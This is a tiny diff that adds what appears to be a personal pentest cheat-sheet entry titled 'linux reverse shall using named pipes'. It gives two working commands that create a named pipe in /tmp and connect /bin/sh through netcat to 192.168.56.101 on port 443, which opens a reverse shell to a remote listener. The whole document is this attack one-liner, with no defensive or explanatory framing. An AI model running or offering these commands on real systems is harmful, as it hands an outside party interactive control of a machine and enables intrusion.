@@ -1,0 +1,4 @@
+- linux reverse shall using named pipes
+$ mknod /tmp/backpipe p 
+$ /bin/sh 0</tmp/backpipe | nc 192.168.56.101 443 1>/tmp/backpipe
+
